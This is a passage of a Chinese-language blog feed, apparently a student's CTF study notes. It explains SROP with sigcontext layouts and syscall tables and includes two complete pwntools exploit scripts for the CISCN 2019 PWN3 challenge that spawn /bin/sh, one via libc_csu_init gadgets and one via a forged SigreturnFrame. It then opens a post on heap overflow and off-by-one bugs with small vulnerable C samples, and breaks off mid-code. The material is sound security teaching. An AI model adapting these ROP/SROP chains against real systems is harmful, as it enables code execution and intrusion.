并行，就是许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作。</p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>虚拟机提供对整个计算机的抽象，包括操作系统、处理器和程序。</p><p>虚拟机这个抽象概念与之前的进程、虚拟内存和文件的抽象概念关系如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%BD%E8%B1%A1.png"></p><hr><p>之前一直在<del>快乐暑假摆烂</del> 到处吃席，终于要开始恢复学习状态辣🤪</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2023/08/15/SROP/"/>
    <url>/2023/08/15/SROP/</url>
    
    <content type="html"><![CDATA[<p> Sigreturn Oriented Programming (SROP)，面向 Sigreturn 的编程 </p><span id="more"></span><h1 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h1><h3 id="Signal-handing"><a href="#Signal-handing" class="headerlink" title="Signal handing"></a>Signal handing</h3><p>信号处理（Signal handing）是 UNIX 系统中进程相互通信的一种机制。 在信号处理过程中，首先会保存当前进程的上下文，然后执行信号处理程序，最后恢复上下文并继续正常执行。</p><p>SROP 本质是 sigreturn 这个系统调用，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。</p><h3 id="context"><a href="#context" class="headerlink" title="context"></a>context</h3><p>对于信号帧（signal Frame）来说，会因为架构的不同而有所区别。以下分别给出 32 位和 64 位的 sigcontext ：</p><ul><li>32位</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>64位</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>信号帧都会被直接压入堆栈中存储，如下图中 siginfo 和 ucontext 组成信号帧</p><p><img src="D:/笔记/PWN/SROP/栈结构.png"></p><p>简而言之，</p><p>在运行信号处理程序之前——上下文被推入堆栈<br>完成执行信号处理程序后——上下文将从堆栈中弹出</p><h3 id="sigreturn"><a href="#sigreturn" class="headerlink" title="sigreturn"></a>sigreturn</h3><p>最重要的是 sigreturn 部分，signal handler 返回后，内核为执行 sigreturn 系统调用，要恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。它不检查上下文中栈的完整性，只是简单的填充对应的内容到相应的寄存器中。</p><p><img src="/img/SROP/sigreturn.png"></p><p>这就意味着我们只要把想要的值填进寄存器，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell，达到想要的效果。</p><p>其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h3 id="SROP特点"><a href="#SROP特点" class="headerlink" title="SROP特点"></a>SROP特点</h3><ul><li><p>依赖系统调用（syscall）强但对 libc.so 的依赖极少。</p></li><li><p>要有空间存放 Signal Frame 的信息.</p></li><li><p>与其他 rop 相比，对的依赖 gadgets 较少。</p></li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。因此我们就可以在程序某一个地方伪造一个 <code>signal Frame</code> ，再让程序 <code>sys_rt_sigreturn</code> 我们构造的 fake signal Frame，让进程恢复到我们构造的恶意状态。</p><p><img src="/img/SROP/system_call_chains.png"></p><p>利用的前提是目标程序中存在 sigreturn片段也就是 <code>syscall;ret;</code> 代码段，我们直接向栈上写入 Signal Frame 即可。</p><p>以下是常用的系统调用号：</p><ul><li>i386</li></ul><table><thead><tr><th align="center">NR</th><th align="center">syscall name</th><th align="center">%eax</th><th align="center">arg0 (%ebx)</th><th align="center">arg1 (%ecx)</th><th align="center">arg2 (%edx)</th></tr></thead><tbody><tr><td align="center">3</td><td align="center">read</td><td align="center">0x03</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">4</td><td align="center">write</td><td align="center">0x04</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">5</td><td align="center">open</td><td align="center">0x05</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td></tr><tr><td align="center">11</td><td align="center">execve</td><td align="center">0x0b</td><td align="center">const char *filename</td><td align="center">char *const *argv</td><td align="center">char *const *envp</td></tr><tr><td align="center">173</td><td align="center">rt_sigreturn</td><td align="center">0xad</td><td align="center">?</td><td align="center">?</td><td align="center">?</td></tr></tbody></table><ul><li>amd64</li></ul><table><thead><tr><th align="center">NR</th><th align="center">syscall name</th><th align="center">%rax</th><th align="center">arg0 (%rdi)</th><th align="center">arg1 (%rsi)</th><th align="center">arg2 (%rdx)</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">read</td><td align="center">0x00</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">1</td><td align="center">write</td><td align="center">0x01</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">open</td><td align="center">0x02</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td></tr><tr><td align="center">3</td><td align="center">rt_sigreturn</td><td align="center">0x0f</td><td align="center">?</td><td align="center">?</td><td align="center">?</td></tr><tr><td align="center">59</td><td align="center">execve</td><td align="center">0x3b</td><td align="center">const char *filename</td><td align="center">char *const *argv</td><td align="center">char *const *envp</td></tr></tbody></table><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h4 id="CISCN-2019华南-PWN3"><a href="#CISCN-2019华南-PWN3" class="headerlink" title="[CISCN 2019华南] PWN3"></a>[CISCN 2019华南] PWN3</h4><p>题目链接：<a href="https://www.nssctf.cn/problem/133">CISCN 2019华南]PWN3 | NSSCTF</a></p><h5 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h5><h6 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h6><p><img src="/img/SROP/srop1_checksec.png"></p><p>运行起来只有一个输入和输出，没有任何文字提示</p><p><img src="/img/SROP/srop1_checksec2.png"></p><h6 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h6><p>整个程序很小就只有一个函数 <code>vlun()</code>，利用的是 syscall 系统调用来调用所用到的函数。</p><p><img src="/img/SROP/srop1_vuln.png"></p><p>read 可以读取 400 字节，但是 buf 只有 10 字节长度，是一个可以用空间很大的栈溢出问题。同样输出也是大于 buf 大小的，所以可以造成信息泄露。</p><p>我们看汇编代码部分，有一个现成的 <code>syscall;ret;</code> 供我们使用。</p><p><img src="/img/SROP/srop1_syscall.png"></p><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>在第一次 read、write 时向栈上写入 ‘&#x2F;bin&#x2F;sh\x00’，并泄露出它的地址。</p><p>泄露地址后需要计算相应的偏移，我们本地调试，在等待输入的时候输入aaaa，接着直接 <code>search aaaa</code> 查看字符串存储的位置。</p><p><img src="/img/SROP/srop1_str.png"></p><p>我们最开始进入函数的时候的 rsi 指向栈基址，</p><p><img src="/img/SROP/srop1_rip.png"></p><p>所以我们的偏移是 offset &#x3D; 0xe0d8-0xdfc0&#x3D;0x118</p><p>有两种攻击方法：</p><ul><li>execve 与 libc_csu_init</li></ul><p>用利用题目中 <code>mov rax, 3Bh;ret</code> gatget 来修改 rax 为 0x3b（execve），同时利用 libc_csu_init 来修改 rdx 为 0，用 <code>pop rdi;ret</code> 来修改 rdi 的值指向 <code>/bin/sh</code> 。</p><ul><li>srop</li></ul><p>利用 srop ，在栈中部署一个伪造 signal Frame sigcontext，然后用 rt_sigreturn 来恶意恢复重而 get shell 。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(pay)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>stack=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br>rax=<span class="hljs-number">0x04004E2</span> <br>libc_csu_init_gat1=<span class="hljs-number">0x040059A</span><br>libc_csu_init_gat2=<span class="hljs-number">0x0400580</span><br>rdi_ret=<span class="hljs-number">0x04005a3</span><br>syscall_ret=<span class="hljs-number">0x0000000000400517</span><br><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(libc_csu_init_gat1)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(stack+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libc_csu_init_gat2)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(rdi_ret)+p64(stack)+p64(syscall_ret)<br><br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(pay)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>stack=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br><br>syscall_ret=<span class="hljs-number">0x0400517</span>   <span class="hljs-comment"># syscall ; ret</span><br>rax=<span class="hljs-number">0x004004DA</span>  <span class="hljs-comment">#mov rax, 0Fh;ret</span><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span><br>frame.rdi = stack<br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_ret<br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(syscall_ret)+<span class="hljs-built_in">str</span>(frame)<br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆漏洞利用(一)</title>
    <link href="/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/"/>
    <url>/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>堆漏洞的利用姿势，赶紧来学习一下吧！！</p><span id="more"></span><p><del>这个人发什么疯</del></p><blockquote><p>如果没有特殊说明，环境为 ubuntu16  libc2.23  64位</p><p>这个网址可以查看源码 ：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.23) - Bootlin</a></p></blockquote><h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>堆溢出是指程序向某个堆块写入的字节数超过了堆块本身<strong>可以使用的字节数</strong>，因而导致了数据溢出，并覆盖到了物理相邻的高地址的下一个堆块。</p><p>堆溢出的前提是：</p><ul><li>程序向堆上写入数据</li><li>写入的数据大小没有被良好的控制</li></ul><p>堆溢出和栈溢出、BSS段溢出相似，是一种缓冲区溢出。但是与栈溢出不同的是，对上并没有返回地址这样的可以让攻击者直接控制执行流程的数据，因此在堆溢出的利用中，我们无法通过控制EIP来控制程序。</p><p>但我们可以利用与堆相关的数据结构哇，我们的利用策略如下：</p><ul><li><p>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容</p><ul><li><p>prev_size</p></li><li><p>size，低三位的比特位数据，以及堆块真正的大小</p><ul><li><p>NON_MAIN_ARENA</p></li><li><p>IS_MAPPED</p></li><li><p>PREV_INUSE</p></li><li><p>the true chunk size</p></li></ul></li><li><p>chunk content，改变程序的执行流</p></li></ul></li><li><p>利用堆的机制实现任意地址写入或者控制堆块中的内容，从而执行程序的控制流。</p></li></ul><h3 id="举个栗子："><a href="#举个栗子：" class="headerlink" title="举个栗子："></a>举个栗子：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>  <span class="hljs-type">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  gets(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们输入A*100，就可以把相邻的堆覆盖掉</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_first.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_last.png"></p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><h5 id="寻找分配函数"><a href="#寻找分配函数" class="headerlink" title="寻找分配函数"></a>寻找分配函数</h5><p>通常来说，堆通过 malloc 函数分配，在某些情况下也会通过 calloc 函数分配。这两个函数的区别就是 calloc 在分配后会将空间全部初始化为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//等同于</span><br>ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure><p>除此之外，还有一个 realloc 分配方式，用于将目标内存扩大。realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reaclloc(prt,size)        <span class="hljs-comment">//将ptr内存大小增大到size。</span><br></code></pre></td></tr></table></figure><p>具体操作：</p><ul><li><p>如果 realloc 的 size 不等于 prt 的 size ：</p><ul><li>申请 size &gt; 原来的 size<ul><li>如果 chunk 与 top chunk 相邻，直接拓展这个 chunk 到新的 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 <code>free(ptr); malloc(new_size)</code></li></ul></li><li>申请 size &lt; 原来的 size<ul><li>如果相差不足以容纳一个最小的 chunk，（64 位下 32 个字节，32 位下 16 个字节），则保持不变</li><li>如果相差足够容纳下一个最小的 chunk，就切割原本的 chunk，free 掉后半部分</li></ul></li></ul></li><li><p>如果 realloc 的 size 等于 0，相当于 <code>free(prt)</code></p></li><li><p>如果 realloc 的 size 等于 prt 的 size，那计算机将不进行任何操作</p></li></ul><h5 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h5><p>其实就是栈溢出的时候我们利用的那一批危险函数。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h5 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h5><p>计算我们开始写入的地址与我们所要覆盖的地址之间的距离。需要注意的是，malloc参数并不等于实际堆块分配的大小，我们之前提到，在实际的内存分配中需要保证chunk 大小是对齐的（字长的两倍）。</p><p>并且也并不是机器分配的chunk都是用户可以使用的用户区域，<code>chunk_head.size = 用户区域大小 + 2 * 字长</code></p><p>就比如我们使用 <code>malloc(24)</code> ，在 64 位的系统中申请 24 字节的 chunk 。但由于需要保证内存对齐，系统会向上取整到 32 字节。在分配出来的32字节中，又有两个机器字长也就是 16 字节的头部不能供用户使用，所以实际上我们申请 24 字节的字段，实际上用户可以使用的 chunk 为 16 字节。</p><p>但是这个堆块仍然可以储存24字节的数据，因为它可以使用下一个 chunk 的 pre_size 字段，正好 24 个字节（ off-by-one 漏洞就是这么来的）。</p><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p>严格来讲 off-by-one 也是一种溢出的操作，但是 off-by-one 特指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只<strong>越界了一个字节</strong>的溢出利用。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>off-by-one 是单字节溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况（就像上一个 malloc(24) 的例子）。</p><p>其中边界验证不严谨主要有以下几种可能：</p><ul><li>使用循环语句向堆中写入数据时，循环次数设置错误</li><li>字符串操作不正确</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h5 id="溢出字节为可控制字节"><a href="#溢出字节为可控制字节" class="headerlink" title="溢出字节为可控制字节"></a>溢出字节为可控制字节</h5><p>通过修改内存块的大小造成块结构之间的重叠，从而泄露其他块数据，或是覆盖修改其他块数据。</p><h5 id="溢出字节为NULL字节"><a href="#溢出字节为NULL字节" class="headerlink" title="溢出字节为NULL字节"></a>溢出字节为NULL字节</h5><p>在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p><ul><li>使用 unlink 进行处理</li><li>这时 <code>prev_size</code> 域就会启用，可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li></ul><blockquote><p>在glibc2.28及以前的版本中都是可以使用的，最新版本中已经添加了对应的检查方法。</p></blockquote><h4 id="🌰："><a href="#🌰：" class="headerlink" title="🌰："></a>🌰：</h4><p>栗子1：</p><p>导致 off-by-one 漏洞的一个原因就是输入的边界检查不清，以下是一个栅栏错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 